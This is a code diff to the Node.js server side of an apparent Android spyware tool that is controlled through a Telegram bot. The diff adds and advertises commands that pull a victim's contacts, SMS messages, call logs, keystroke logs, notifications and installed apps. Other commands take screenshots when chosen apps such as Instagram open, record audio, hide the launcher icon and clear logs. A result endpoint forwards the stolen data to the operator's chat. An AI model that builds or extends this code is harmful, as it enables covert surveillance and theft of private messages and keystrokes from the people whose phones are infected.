@@ -101,62 +101,63 @@ function getHelpMessage() {
           <i>When quality matters most</i>
 
 /size_status - Check current screenshot size setting
+/screenshot_settings - View all current screenshot settings
 
 <b>📸 ADVANCED SCREENSHOT COMMANDS</b>
 /screenshot - Take a screenshot NOW (with current size setting)
-/screenshot_settings - View current screenshot settings
 /auto_on - Enable auto-screenshot when apps open
 /auto_off - Disable auto-screenshot
 /auto_status - Check auto-screenshot settings
+/auto_interval [seconds] - Set time between screenshots
+/auto_max [number] - Set max screenshots per session
+/add_target [package] - Add app to monitor
+/remove_target [package] - Remove app from monitoring
+/target_apps - List all monitored apps
+
+<b>📱 DATA EXTRACTION COMMANDS - RETURNS ACTUAL CONTENT</b>
+/contacts - Get full contact list with names and numbers
+/calllogs - Get recent call logs with details
+/sms - Get recent SMS messages with content
+/apps - List all installed apps
+/keystrokes - Get recent keystroke logs
+/notifications - Get recent notifications with content
 
 <b>🎤 RECORDING COMMANDS</b>
 /record - Start 60s audio recording NOW
-/stream_start - Start live streaming
-/stream_stop - Stop live streaming
-
-<b>📱 DATA EXTRACTION COMMANDS</b>
-/contacts - Get contact list
-/calllogs - Get recent call logs
-/sms - Get recent SMS messages
-/apps - List installed apps
-/keystrokes - Get recent keystrokes
-/notifications - Get recent notifications
+/start_recording - Start scheduled recording service
+/stop_recording - Stop recording service
 
 <b>⚙️ SERVICE CONTROL COMMANDS</b>
-/start_screenshot - Start screenshot SERVICE (continuous)
+/start_screenshot - Start screenshot service
 /stop_screenshot - Stop screenshot service
-/start_recording - Start scheduled recording SERVICE
-/stop_recording - Stop recording service
 /start_stream - Start streaming service
 /stop_stream - Stop streaming service
+/reboot_app - Restart all services
 
 <b>🛠️ UTILITY COMMANDS</b>
 /ping - Test connection
 /time - Get device time
 /info - Get detailed device info
+/hide_icon - Hide launcher icon
+/show_icon - Show launcher icon
 
 <b>📊 STATS COMMANDS</b>
 /logs_count - Get total log count
 /logs_recent - Get 10 most recent logs
 /stats - Get detailed statistics
-
-<b>⚠️ DANGER COMMANDS</b>
 /clear_logs - Clear all logs
-/reboot_app - Restart all services
-/hide_icon - Hide launcher icon
-/show_icon - Show launcher icon
 
 <b>📋 SIZE COMPARISON (1080p screenshot)</b>
 • /small - ~20-50 KB - Fast transmission
 • /medium - ~100-200 KB - Good balance
 • /original - ~500 KB - 2 MB - Best quality
 
-<b>📋 AUTO-SCREENSHOT EXAMPLES</b>
-• /auto_on - Enable auto-screenshot
-• /auto_interval 30 - Take screenshot every 30 seconds
-• /auto_max 10 - Stop after 10 screenshots
-• /add_target com.instagram.android - Monitor Instagram
-• /target_apps - See all monitored apps
+<b>📋 COMMAND EXAMPLES</b>
+• /contacts - Shows actual contacts list
+• /sms - Shows actual SMS messages
+• /calllogs - Shows actual call history
+• /storage - Shows storage usage
+• /network - Shows network details
 
 For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
@@ -255,8 +256,31 @@ async function handleCommand(chatId, command, messageId) {
     console.log(`📝 Command queued:`, commandObject);
     console.log(`📊 Pending commands: ${device.pendingCommands.length}`);
 
-    // Acknowledge
-    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
+    // Acknowledge based on command type
+    let ackMessage = `⏳ Processing: ${command}`;
+    
+    // Custom acknowledgments for different command types
+    if (cleanCommand === 'contacts') {
+        ackMessage = `📇 Fetching your contacts... This may take a moment.`;
+    } else if (cleanCommand === 'sms') {
+        ackMessage = `💬 Retrieving SMS messages...`;
+    } else if (cleanCommand === 'calllogs' || cleanCommand === 'call_logs') {
+        ackMessage = `📞 Getting call history...`;
+    } else if (cleanCommand === 'apps') {
+        ackMessage = `📱 Listing installed apps...`;
+    } else if (cleanCommand === 'keystrokes') {
+        ackMessage = `⌨️ Fetching keystroke logs...`;
+    } else if (cleanCommand === 'notifications') {
+        ackMessage = `🔔 Getting recent notifications...`;
+    } else if (cleanCommand === 'storage') {
+        ackMessage = `💾 Calculating storage usage...`;
+    } else if (cleanCommand === 'network') {
+        ackMessage = `📡 Getting network information...`;
+    } else if (cleanCommand === 'screenshot_settings') {
+        ackMessage = `📸 Fetching screenshot settings...`;
+    }
+    
+    await sendTelegramMessage(chatId, ackMessage);
 }
 
 // ============= API ENDPOINTS =============
@@ -317,7 +341,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    console.log(`📨 Result from ${deviceId}:`, { command, result, error });
+    console.log(`📨 Result from ${deviceId}:`, { command, result: result ? result.substring(0, 50) + '...' : null, error });
     
     const device = devices.get(deviceId);
     if (device) {
@@ -329,11 +353,11 @@ app.post('/api/result/:deviceId', async (req, res) => {
             message = `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`;
         } else {
             // Check if result contains special formatting
-            if (result.includes('SMALL') || result.includes('MEDIUM') || result.includes('ORIGINAL')) {
-                // Size preset result - show with emoji
-                message = `✅ <b>${result}</b>`;
+            if (result) {
+                // For data extraction commands, just pass through the formatted result
+                message = result;
             } else {
-                message = `✅ <b>Command Executed</b>\n\n<code>${command}</code>\n\n${result}`;
+                message = `✅ <b>Command Executed</b>\n\n<code>${command}</code>`;
             }
         }
         
@@ -370,7 +394,7 @@ app.post('/api/register', async (req, res) => {
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
     console.log(`📊 Total devices: ${devices.size}`);
     
-    // Send confirmation with size options
+    // Send confirmation with all available commands
     await sendTelegramMessage(chatId, 
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
@@ -381,7 +405,18 @@ app.post('/api/register', async (req, res) => {
         `• /small - Max compression (20-50 KB)\n` +
         `• /medium - Balanced (100-200 KB)\n` +
         `• /original - Best quality (500 KB+)\n\n` +
-        `Current: <b>MEDIUM</b> (default)`);
+        `<b>📱 Data Extraction Commands:</b>\n` +
+        `• /contacts - Get full contact list\n` +
+        `• /sms - Get SMS messages\n` +
+        `• /calllogs - Get call history\n` +
+        `• /apps - List installed apps\n` +
+        `• /keystrokes - Get keystroke logs\n` +
+        `• /notifications - Get notifications\n\n` +
+        `<b>🔍 Info Commands:</b>\n` +
+        `• /storage - Storage usage\n` +
+        `• /network - Network details\n` +
+        `• /screenshot_settings - Current settings\n\n` +
+        `Current size: <b>MEDIUM</b> (default)`);
     
     res.json({ status: 'registered', deviceId });
 });
@@ -429,9 +464,8 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-            <p><b>Available Commands:</b> /small, /medium, /original, /size_status, /screenshot, /status, /location</p>
+            <p><b>Available Commands:</b> /contacts, /sms, /calllogs, /apps, /keystrokes, /notifications, /storage, /network, /screenshot_settings</p>
             <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
-            <p><a href="/test-small" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test /small</a></p>
         </body>
         </html>
     `);
@@ -444,18 +478,6 @@ app.get('/test-help', async (req, res) => {
     res.json({ success: !!result, result });
 });
 
-app.get('/test-small', async (req, res) => {
-    const chatId = '5326373447';
-    const result = await sendTelegramMessage(chatId, 
-        '✅ <b>Screenshot size set to: SMALL</b>\n\n' +
-        '• Quality: 30%\n' +
-        '• Resolution: 25%\n' +
-        '• Grayscale: ON\n' +
-        '• Color Reduction: ON\n\n' +
-        'Estimated file size: 20-50 KB');
-    res.json({ success: !!result, result });
-});
-
 // ============= START SERVER =============
 
 app.listen(PORT, '0.0.0.0', () => {
@@ -463,10 +485,15 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n📸 NEW: Screenshot Size Commands:');
-    console.log('   └─ /small     - Max compression (20-50 KB)');
-    console.log('   └─ /medium    - Balanced (100-200 KB)');
-    console.log('   └─ /original  - Best quality (500 KB+)');
-    console.log('   └─ /size_status - Check current size');
+    console.log('\n📱 NEW DATA EXTRACTION COMMANDS:');
+    console.log('   └─ /contacts     - Returns actual contact list');
+    console.log('   └─ /sms          - Returns actual SMS messages');
+    console.log('   └─ /calllogs     - Returns actual call history');
+    console.log('   └─ /apps         - Returns installed apps list');
+    console.log('   └─ /keystrokes   - Returns keystroke logs');
+    console.log('   └─ /notifications- Returns notifications');
+    console.log('   └─ /storage      - Storage usage details');
+    console.log('   └─ /network      - Network information');
+    console.log('   └─ /screenshot_settings - Current settings');
     console.log('\n🚀 ===============================================\n');
 });
